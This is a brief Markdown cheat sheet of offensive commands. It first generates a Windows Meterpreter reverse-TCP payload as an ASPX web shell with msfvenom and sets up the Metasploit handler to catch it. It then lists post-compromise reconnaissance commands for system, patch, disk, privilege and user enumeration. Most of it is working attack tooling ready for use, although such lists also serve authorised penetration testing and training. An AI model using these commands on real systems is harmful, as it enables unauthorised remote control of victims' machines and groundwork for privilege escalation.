# Metasploit Windows Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
```

# Windows Shell Check System info
```
systeminfo

systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"

wmic qfe

wmic qfe Caption,Description,HotFixID,InstalledOn

wmic logicaldisk

wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

# Windows User info
```
whoami

whoami /priv

whoami /groups

net user

net user jack

net localgroup

net localgroup 
```
